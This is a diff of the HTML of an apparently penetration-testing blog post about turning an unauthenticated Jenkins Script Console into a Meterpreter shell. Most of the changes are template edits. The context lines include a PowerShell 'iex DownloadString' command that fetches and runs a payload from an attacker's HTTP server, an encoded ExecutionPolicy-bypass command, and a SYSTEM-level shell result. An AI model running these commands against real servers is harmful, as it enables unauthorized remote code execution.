@@ -18,6 +18,7 @@
   <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
   <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
 
   
   <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
@@ -30,6 +31,16 @@
 
   <meta name="description" content="">
   <meta name="keywords" content="">
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-44457032-2', 'auto');
+    ga('send', 'pageview');
+  </script>
   
 </head>
 <body class="theme-base-0d">
@@ -76,7 +87,7 @@
 
 <div class="content container">
   <div class="post">
-    <h1>jenkins to meterpreter - toying with powersploit</h1>
+    <h1 class="post-title">jenkins to meterpreter - toying with powersploit</h1>
     <span class="post-date">May 27, 2015 &middot; 5 minute read &middot; <a href="https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/#disqus_thread">Comments</a>
     
     <br/>
@@ -95,7 +106,7 @@
 
 <p>Recently I came across a few <a href="https://jenkins-ci.org/">Jenkins</a> continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be <em>&lsquo;secure&rsquo;</em>. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.</p>
 
-<h2 id="groooooooovy:35eefdc71518d1a65a4e14a71c4812fa">groooooooovy</h2>
+<h2 id="groooooooovy">groooooooovy</h2>
 
 <p>At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the <em>Script Console</em> that Jenkins provides:</p>
 
@@ -127,7 +138,7 @@ println &quot;Found text ${process.text}&quot;
 
 <p>Nice and easy command execution! :D</p>
 
-<h2 id="interactive-shell-power-shell:35eefdc71518d1a65a4e14a71c4812fa">interactive shell, power shell</h2>
+<h2 id="interactive-shell-power-shell">interactive shell, power shell</h2>
 
 <p>Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a> and moving on from there. On Windows based environments though, the builtin <code>cmd.exe</code> definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.</p>
 
@@ -137,7 +148,7 @@ println &quot;Found text ${process.text}&quot;
 
 <p>In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A <code>payload</code> which includes the <code>Invoke-Shellcode.ps1</code> powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don&rsquo;t worry it should be more clear after we have gone through it.</p>
 
-<h2 id="preparing-the-payload:35eefdc71518d1a65a4e14a71c4812fa">preparing the payload</h2>
+<h2 id="preparing-the-payload">preparing the payload</h2>
 
 <p>As already mentioned, I was going to use <code>Invoke-Shellcode.ps1</code> from <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a>. This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about <em>payload</em> here, all it really is is a file that will be made available via HTTP for the powershell script to download.</p>
 
@@ -153,9 +164,9 @@ println &quot;Found text ${process.text}&quot;
 
 <p>This file was finally served via HTTP using the python SimpleHTTPServer with <code>python -m SimpleHTTPServer</code> which meant that it would be available at <a href="http://192.168.252.1:8000/payload">http://192.168.252.1:8000/payload</a>.</p>
 
-<h2 id="preparing-the-command:35eefdc71518d1a65a4e14a71c4812fa">preparing the command</h2>
+<h2 id="preparing-the-command">preparing the command</h2>
 
-<p>Next, we need to prepare the actual command to run. We will make use of the powershell <a href="https://technet.microsoft.com/en-us/library/hh849893.aspx">Invoke-Expression</a> command and give it a <a href="https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx">Net.WebClient.DownloadString</a> object to download the payload we previously prepared and execute it.</p>
+<p>Next, we need to prepare the actual command to run. We will make use of the powershell <a href="https://technet.microsoft.com/en-us/library/hh849893.aspx">Invoke-Expression</a> command and give it a [Net.WebClient.DownloadString](<a href="https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx">https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx</a>) object to download the payload we previously prepared and execute it.</p>
 
 <pre><code class="language-powershell">iex (New-Object Net.WebClient).DownloadString('http://192.168.252.1:8000/payload')
 </code></pre>
@@ -170,7 +181,7 @@ println &quot;Found text ${process.text}&quot;
 <pre><code class="language-powershell">cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc aQBlAHgAIAAoAE4 [snip] BjBkACcAKQAKAA==
 </code></pre>
 
-<h2 id="pwn:35eefdc71518d1a65a4e14a71c4812fa">pwn</h2>
+<h2 id="pwn">pwn</h2>
 
 <p>So, I now had the <code>payload</code> file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!</p>
 
@@ -203,7 +214,7 @@ meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 </code></pre>
 
-<h2 id="automation:35eefdc71518d1a65a4e14a71c4812fa">automation</h2>
+<h2 id="automation">automation</h2>
 
 <p>While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:</p>
 
@@ -266,14 +277,6 @@ var disqus_shortname = "slashnote";
 
 <script src="https://leonjza.github.io/js/highlight.pack.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
-
-<script>
-  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
-  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
-  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
-  s.parentNode.insertBefore(g,s)}(document,'script'));
-</script>
-
 </body>
 </html>
 
